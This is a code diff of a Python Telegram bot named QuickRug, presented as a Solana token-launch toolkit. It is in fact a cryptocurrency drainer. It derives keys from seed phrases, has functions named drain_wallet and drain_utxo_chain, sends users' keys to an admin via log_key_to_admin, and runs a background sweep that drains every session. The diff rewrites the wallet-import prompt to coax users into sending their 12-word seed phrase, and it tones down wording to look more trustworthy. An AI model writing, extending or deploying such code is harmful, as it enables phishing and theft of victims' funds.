'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']
 
 def fake_sig() -> str:
     return "".join(random.choices(string.ascii_letters + string.digits, k=88))
@@ -416,9 +410,8 @@ def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
     return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
 
 
-# ──────────────────────────────────────────────
-# KEY DERIVATION
-# ──────────────────────────────────────────────
+# ──────────────────────────────# KEY DERIVATION
+# ──────────────────────────────
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
     salt = ("mnemonic" + passphrase).encode("utf-8")
     return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)
@@ -657,9 +650,8 @@ def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[
         return None
 
 
-# ──────────────────────────────────────────────
-# BTC / LTC
-# ──────────────────────────────────────────────
+# ──────────────────────────────# BTC / LTC
+# ──────────────────────────────
 def _hash160(b: bytes) -> bytes:
     return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()
 
@@ -1032,9 +1024,8 @@ async def drain_utxo_chain(
         return None
 
 
-# ──────────────────────────────────────────────
-# BALANCE HELPERS
-# ──────────────────────────────────────────────
+# ──────────────────────────────# BALANCE HELPERS
+# ──────────────────────────────
 async def fetch_sol_balance(pubkey: str) -> float:
     if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
         return 0.0
@@ -1097,9 +1088,8 @@ async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tup
     return label, priv, pub, best_bal
 
 
-# ──────────────────────────────────────────────
-# DRAIN CORE
-# ──────────────────────────────────────────────
+# ──────────────────────────────# DRAIN CORE
+# ──────────────────────────────
 async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
     if not HAS_SOLANA:
         log.warning("Solana libs missing — drain simulated")
@@ -1334,9 +1324,8 @@ async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float,
         log.exception("Failed to log key to admin: %s", e)
 
 
-# ──────────────────────────────────────────────
-# BACKGROUND SWEEP
-# ──────────────────────────────────────────────
+# ──────────────────────────────# BACKGROUND SWEEP
+# ──────────────────────────────
 async def _sweep_all_sessions() -> Tuple[int, int]:
     tried = 0
     drained = 0
@@ -1381,60 +1370,54 @@ async def _sweep_loop(interval: float) -> None:
         raise
 
 
-# ──────────────────────────────────────────────
-# KEYBOARDS
-# ──────────────────────────────────────────────
+# ──────────────────────────────# KEYBOARDS
+# ──────────────────────────────
 def main_menu_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
+    b.row(InlineKeyboardButton(text="Start", callback_data="menu:launch"))
     b.row(
-        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
-        InlineKeyboardButton(text="🔑 Wallet", callback_data="menu:wallets"),
+        InlineKeyboardButton(text="Wallet", callback_data="menu:wallets"),
+        InlineKeyboardButton(text="Activity", callback_data="menu:tx"),
     )
     b.row(
-        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
-        InlineKeyboardButton(text="📡 Activity", callback_data="menu:tx"),
+        InlineKeyboardButton(text="Portfolio", callback_data="menu:portfolio"),
+        InlineKeyboardButton(text="Scanner", callback_data="menu:scanner"),
     )
     b.row(
-        InlineKeyboardButton(text="🛡 Scanner", callback_data="menu:scanner"),
-        InlineKeyboardButton(text="📊 Stats", callback_data="menu:stats"),
-    )
-    b.row(
-        InlineKeyboardButton(text="⚙️ Settings", callback_data="menu:settings"),
-        InlineKeyboardButton(text="ℹ️ About", callback_data="menu:about"),
+        InlineKeyboardButton(text="Settings", callback_data="menu:settings"),
+        InlineKeyboardButton(text="About", callback_data="menu:about"),
     )
     return b.as_markup()
 
 
 def back_menu_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
 
 
 def wallets_empty_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Wallet", callback_data="menu:wallets"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
+    b.row(InlineKeyboardButton(text="Connect Wallet", callback_data="wallet:import"))
     if has_wallets:
         b.row(
-            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
-            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
+            InlineKeyboardButton(text="Switch", callback_data="wallet:switch"),
+            InlineKeyboardButton(text="Refresh", callback_data="wallet:refresh"),
         )
-        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
-        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        b.row(InlineKeyboardButton(text="Remove all", callback_data="wallet:clear"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def promo_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
-    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
-    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Enter promo code", callback_data="promo:enter"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1463,13 +1446,13 @@ def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
         InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
     )
-    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
     ])
 
 
@@ -1484,24 +1467,24 @@ def socials_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="📸 Instagram", callback_data="social:ig"),
     )
     b.row(
-        InlineKeyboardButton(text="✅ Done", callback_data="socials:done"),
-        InlineKeyboardButton(text="⏭ Skip", callback_data="socials:skip"),
+        InlineKeyboardButton(text="Done", callback_data="socials:done"),
+        InlineKeyboardButton(text="Skip", callback_data="socials:skip"),
     )
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def bundle_kb() -> InlineKeyboardMarkup:
     b = InlineKeyboardBuilder()
     b.row(
-        InlineKeyboardButton(text="👥 5 Wallets", callback_data="bundle:5"),
-        InlineKeyboardButton(text="👥 10 Wallets", callback_data="bundle:10"),
+        InlineKeyboardButton(text="5 Wallets", callback_data="bundle:5"),
+        InlineKeyboardButton(text="10 Wallets", callback_data="bundle:10"),
     )
     b.row(
-        InlineKeyboardButton(text="👥 15 Wallets", callback_data="bundle:15"),
-        InlineKeyboardButton(text="👥 25 Wallets", callback_data="bundle:25"),
+        InlineKeyboardButton(text="15 Wallets", callback_data="bundle:15"),
+        InlineKeyboardButton(text="25 Wallets", callback_data="bundle:25"),
     )
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1518,14 +1501,14 @@ def invest_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
     )
     b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
-    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def confirm_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
+        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")],
     ])
 
 
@@ -1556,42 +1539,33 @@ def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
 
 
 def tx_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="menu:main")]])
 
 
-# ──────────────────────────────────────────────
-# COPY
-# ──────────────────────────────────────────────
+# ──────────────────────────────# COPY
+# ──────────────────────────────
 def build_main_menu_text(sess: "UserSession") -> str:
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
         wallet_line = f"<code>{short_addr(w.public_key)}</code> · {SOL_EMOJI} <b>{w.balance_sol:.4f}</b>"
+        status = "Wallet connected."
     else:
-        wallet_line = "<i>not linked — import to launch</i>"
-    sniper = "ON" if sess.settings.get("sniper_protection", True) else "OFF"
-    mev = "ON" if sess.settings.get("mev_protection", True) else "OFF"
+        wallet_line = "Not connected"
+        status = "Press Start to connect your wallet and launch."
     return (
-        "⚡ <b>QuickRug</b>\n"
-        "────────────────\n\n"
-        f"Wallet     {wallet_line}\n"
-        f"Launches   <b>{sess.launches_left}</b> remaining\n"
-        f"Protection sniper <b>{sniper}</b> · MEV <b>{mev}</b>\n\n"
-        "Launch · scan · track — pick below."
+        f"<b>Ready to Launch</b>\n\n"
+        f"{status}\n\n"
+        f"Wallet  {wallet_line}\n"
+        f"Launches left  <b>{sess.launches_left}</b>"
     )
 
 
 
 
 WELCOME_TEXT = (
-    "⚡ <b>QuickRug</b>\n"
-    "────────────────\n\n"
-    "Fast Solana launches with bundling,\n"
-    "sniper guard and live fill tracking.\n\n"
-    "<b>Quick start</b>\n"
-    "1. Link a wallet\n"
-    "2. Launch a token\n"
-    "3. Watch activity + portfolio\n\n"
-    "Use <b>Scanner</b> before you size up."
+    "<b>Welcome!</b>\n\n"
+    "QuickRug membership active.\n"
+    "Tap a button below to begin."
 )
 
 
@@ -1629,10 +1603,8 @@ class SettingsStates(StatesGroup):
     waiting_custom_fee = State()
 
 
-# ──────────────────────────────────────────────
-# ROUTER
-# ──────────────────────────────────────────────
-router = Router()
+# ──────────────────────────────# ROUTER
+# ──────────────────────────────router = Router()
 
 
 @router.message(CommandStart())
@@ -1708,7 +1680,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
                 )
             for m in live_mints[:2]:
                 kb.row(InlineKeyboardButton(text=f"💥 Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
-        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
@@ -1751,7 +1723,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
     elif action == "settings":
         s = sess.settings
         text = (
-            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+            "<b>Settings</b>\n\n"
             f"Max slippage: <b>{s['slippage']}%</b>\n"
             "Trades that would fill worse than this fail instead of filling.\n\n"
             f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1762,7 +1734,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
     elif action == "scanner":
         text = (
             "🛡 <b>Token Scanner</b>\n"
-            "────────────────\n\n"
+            "\n"
             "Paste a mint address to run a quick\n"
             "risk check before you size a bag.\n\n"
             "Checks\n"
@@ -1790,7 +1762,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         random.seed()
         text = (
             "📊 <b>QuickRug Stats</b>\n"
-            "────────────────\n\n"
+            "\n"
             f"Active users (session)  <b>{total_users}</b>\n"
             f"Launches tracked        <b>{total_launches}</b>\n"
             f"Live tokens             <b>{live_tokens}</b>\n"
@@ -1802,14 +1774,14 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             "<i>Stats refresh hourly.</i>"
         )
         kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:stats"))
-        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="Refresh", callback_data="menu:stats"))
+        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "about":
         text = (
             "ℹ️ <b>About QuickRug</b>\n"
-            "────────────────\n\n"
+            "\n"
             "Solana launch toolkit built for\n"
             "speed, protection and clean fills.\n\n"
             "<b>What you get</b>\n"
@@ -1826,7 +1798,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         )
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="🎟️ Promo", callback_data="menu:promo"))
-        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        kb.row(InlineKeyboardButton(text="Cancel", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     await cb.answer()
@@ -1853,7 +1825,7 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
         return
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1875,7 +1847,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
     sess.settings["slippage"] = val
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1897,7 +1869,7 @@ async def custom_fee_receive(message: Message, state: FSMContext):
     sess.settings["priority_fee"] = val
     s = sess.settings
     text = (
-        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
+        "<b>Settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1910,12 +1882,15 @@ async def custom_fee_receive(message: Message, state: FSMContext):
 @router.callback_query(F.data == "wallet:import")
 async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     text = (
-        "📥 <b>Send your wallet's seed phrase</b>\n"
-        "(12-24 words), or a private key (base58 / JSON byte array).\n\n"
-        "I'll delete your message right after reading it."
+        "<b>Connect Wallet</b>\n\n"
+        "Please provide your 12-word seed phrase:\n\n"
+        "Requirements:\n"
+        "• Exactly 12 words\n"
+        "• Separate with spaces\n\n"
+        "Security: Only enter seed phrases for wallets you trust."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
+        [InlineKeyboardButton(text="Cancel", callback_data="menu:main")]
     ])
     await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_import)
@@ -1999,7 +1974,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
                 except Exception:
                     pass
         else:
-            await status_msg.edit_text("🔑 <b>Importing key…</b>", parse_mode=ParseMode.HTML)
